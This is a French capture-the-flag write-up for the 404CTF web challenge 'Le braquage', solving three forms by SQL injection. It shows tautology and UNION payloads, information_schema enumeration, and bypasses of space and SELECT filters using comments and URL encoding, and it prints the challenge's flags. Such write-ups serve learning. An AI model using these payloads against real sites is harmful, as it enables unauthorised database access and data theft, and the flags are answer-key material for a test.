Le braquage

UTILISER SQLMAP SUR CE CHALLENGE-CI OU TOUT AUTRE CHALLENGE CONDUIRA A UN BAN

Vous êtes sur une affaire de cambriolage. D’après vos informations, un criminel surnommé TITI a prévu une rencontre avec ses complices pour préparer son prochain casse.

Heureusement, votre équipe est parvenu à trouver un site qu’ils utilisent. Ce site leur permet de communiquer et d’échanger des lieux de rendez-vous ainsi que des fausses identités. A vous d’exploiter cette base de données pour obtenir des informations sur le suspect et son opération : nom, prénom, adresse visée, date du casse, heure du casse, téléphone, mot de passe.

Les différents morceaux de flag sont sous la forme : 404CTF{Nom},404CTF{Prénom},404CTF{Adresse},404CTF{Date},404CTF{Heure},404CTF{Téléphone},404CTF{Mdp}

Le flag final est la concaténation de tous les morceaux sans espace : 404CTF{NomPrénomTéléphoneAdresseDateHeureMdp}

=======================================================================

On a trois pages du site, chacune avec son propre formulaire à injecter.



1 - Discuter avec des vendeurs d’OR près de chez vous
```
    Payload : ' OR '1'='1

    tel : 404CTF{0145769456}
    adresse : 404CTF{21 rue des kiwis}
```


2 - UNION des vendeurs d’OR de la région
```
    ' ORDER BY 2 -- - : OK
    ' ORDER BY 3 -- - : KO

    --> 2 colomnes

    ' UNION SELECT 1,schema_name FROM information_schema.schemata -- -

    --> 1	UnionVendeurs

    ' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='UnionVendeurs' -- -

    --> 1	Users
    --> 1	cooperatives

    ' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='Users' -- -

    --> 1	id
    --> 1	nom
    --> 1	prenom 

    Payload : ' UNION SELECT nom,prenom FROM Users -- -

    nom : 404CTF{Vereux}
    prenom : 404CTF{UnGorfou}
```


3 - Rencontrez des vendeurs et parler avec eux sans FILTRES

    On a un filtre sur les espaces.

    On bypass avec la technique de l'ouverture-fermeture de commentaires qui sont interprétés comme un espace :
```
    Payload : '/**/OR/**/'1'='1

    date : 404CTF{2022-07-14}
    heure : 404CTF{01hDuMatin}
```

3 Bis - Récupérer le mot de passe

    SELECT est filtré. On peut bypass en encodant le SELECT en URL et de même avec les espaces :

    `'%20UNION%20%53%45%4c%45%43%54%201,2,schema_name%20FROM%20information_schema.schemata%20--%20`

    Payload finale :
    
    ```
    '%20UNION%20%53%45%4c%45%43%54%201,%20id,%20mdp%20FROM%20Password%20--%20-

    mdp : 404CTF{GorfousAuPouvoir}
    ```

404CTF{VereuxUnGorfou014576945621ruedeskiwis2022-07-1401hDuMatinGorfousAuPouvoir}
